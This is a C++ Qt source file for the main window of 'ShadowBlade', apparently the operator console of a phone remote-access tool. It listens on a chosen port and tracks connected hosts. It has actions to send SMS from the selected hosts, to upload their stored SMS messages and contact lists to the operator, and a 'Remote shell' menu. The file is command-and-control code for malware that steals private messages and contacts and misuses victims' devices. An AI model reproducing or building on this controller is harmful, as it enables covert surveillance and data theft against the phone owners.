#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QDateTime>
#include <QFile>
#include <QDir>
#include <QTextStream>
#include <QMessageBox>
#include <QInputDialog>
#include <QCloseEvent>
#include <QMouseEvent>
#include "dialog/sendsmsdialog.h"

MainWindow::MainWindow(SessionManager& sessionManager, QWidget *parent) :
    mSessionManager(sessionManager),
    mNetworkManager(sessionManager),
    mModel(mNetworkManager.getHostPool()),
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    initView();
    updateView();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::closeEvent(QCloseEvent * event)
{
    if(QMessageBox::information(this,QString(" "),QString("Quit?"),QMessageBox::Yes,QMessageBox::No)!=QMessageBox::Yes)
    {
        event->ignore();
    }
    else
    {
        event->accept();
    }
}

void MainWindow::initRightMenu(QWidget* widget)
{
    QAction *aAll,*aNone,*aReverse;
    widget->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
    widget->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
    widget->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));

    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),ui->tableView);
    separator->setSeparator(true);
    widget->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    widget->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
    widget->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
    widget->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));

    QObject::connect(aSendSms,SIGNAL(triggered()),this,SLOT(sendSms()));
    QObject::connect(aLoadSms,SIGNAL(triggered()),this,SLOT(loadSms()));
    QObject::connect(aLoadContact,SIGNAL(triggered()),this,SLOT(loadContact()));
}

void MainWindow::initLeftMenu(QWidget* widget)
{
    QAction *aRemoteShell;
    widget->addAction(aRemoteShell = new QAction(QString("Remote shell"),ui->tableView) );

}

void MainWindow::initView()
{
    qRegisterMetaType<HostInfo>("HostInfo");
    QObject::connect(&mNetworkManager, SIGNAL(onHostPoolChange()), &mModel, SLOT(refresh()));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionSuccess(QString,HostInfo)), this, SLOT(onStartSessionSuccess(QString,HostInfo)));
    QObject::connect(&mNetworkManager, SIGNAL(onStartSessionFailed(QString,HostInfo)), this, SLOT(onStartSessionFailed(QString,HostInfo)));
    QObject::connect(&mModel,SIGNAL(modelReset()),this,SLOT(updateView()));
    ui->tableView->setModel(&mModel);
    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
    ui->tableView->resizeColumnToContents(0);
    ui->tableView->horizontalHeader()->resizeSection(1, 200);

    initLeftMenu(&mLeftMenu);
    initRightMenu(ui->tableView);

    ui->actionStartServer->setText("Start Server");
    QObject::connect(ui->actionStartServer, SIGNAL(triggered()), this, SLOT(handleServerStart()));

    outputLogWarning("====================   ShadowBlade Running  ====================");
}

void MainWindow::updateView()
{
    ui->hostCountLabel->setText(QString("Host: %1, Selected: %2").arg(mNetworkManager.getHostPool().size()).arg(mNetworkManager.getHostPool().getSelectedCount()));
}

void MainWindow::handleServerStart()
{
    if(mNetworkManager.isStart())
    {
        mNetworkManager.stop();
        mNetworkManager.getHostPool().cleanAll();
        ui->actionStartServer->setText("Start Server");
        outputLogNormal("Server Stop");
    }
    else
    {
        bool ok = false;
        int port = QInputDialog::getInt(this, "Listen Port", "Input port:", 8000,  1, 65535, 1, &ok);
        if(ok)
        {
            ui->actionStartServer->setText(QString("Stop Server (Listen on %1)").arg(port));
            mNetworkManager.start(port);
            outputLogNormal(QString("Server Start on port: %1").arg(port) );
        }
    }
}

void MainWindow::sendSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    SendSmsDialog sendSmsDialog(this);
    if(sendSmsDialog.exec()==QDialog::Accepted)
    {
        QJsonObject jsonObject;
        QJsonDocument jsonDocument;
        jsonObject.insert(QString("content"), sendSmsDialog.getContent());
        if(sendSmsDialog.isSendNumberList())
        {
            QJsonArray jsonArray;
            vector<QString> numberList = sendSmsDialog.getPhoneNumberList();
            unsigned int i;
            for(i=0; i<numberList.size(); ++i)
            {
                jsonArray.append(numberList.at(i));
            }
            jsonObject.insert(QString("only"), jsonArray);
        }
        jsonDocument.setObject(jsonObject);
        vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
        for(unsigned int i=0; i<hostInfoList.size(); ++i)
        {
            mNetworkManager.startSession(hostInfoList.at(i), ACTION_SEND_SMS, jsonDocument.toJson());
        }
    }
}
void MainWindow::loadSms()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_SMS);
    }
}
void MainWindow::loadContact()
{
    if(mNetworkManager.getHostPool().getSelectedCount()==0)
    {
        QMessageBox::warning(this,QString("Warning"),QString("Please select at least one host"));
        return;
    }
    vector<HostInfo> hostInfoList = mNetworkManager.getHostPool().getSelectedHostAddr();
    for(unsigned int i=0; i<hostInfoList.size(); ++i)
    {
        mNetworkManager.startSession(hostInfoList.at(i), ACTION_UPLOAD_CONTACT);
    }
}

void MainWindow::on_tableView_doubleClicked(const QModelIndex &index)
{
    mCurrentIndex = index.row();
    mLeftMenu.popup(cursor().pos());
}

void MainWindow::outputLogNormal(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + text );
}

void MainWindow::outputLogWarning(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#F00>" + text + "</font>");
}

void MainWindow::outputLogSuccess(const QString& text)
{
    ui->textEdit->append("<font color=#00F>[" + QDateTime::currentDateTime().toString("yyyy-MM-dd HH:mm:ss") + "]</font>:  " + "<font color=#0A0>" + text + "</font>");
}


void MainWindow::onStartSessionSuccess(QString sessionName, HostInfo hostInfo)
{
    outputLogSuccess( QString("[SUCCESS] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
}
void MainWindow::onStartSessionFailed(QString sessionName, HostInfo hostInfo)
{
    outputLogWarning( QString("[FAILED] %1 on %2:%3").arg(sessionName).arg(hostInfo.addr.toString()).arg(hostInfo.port)  );
}
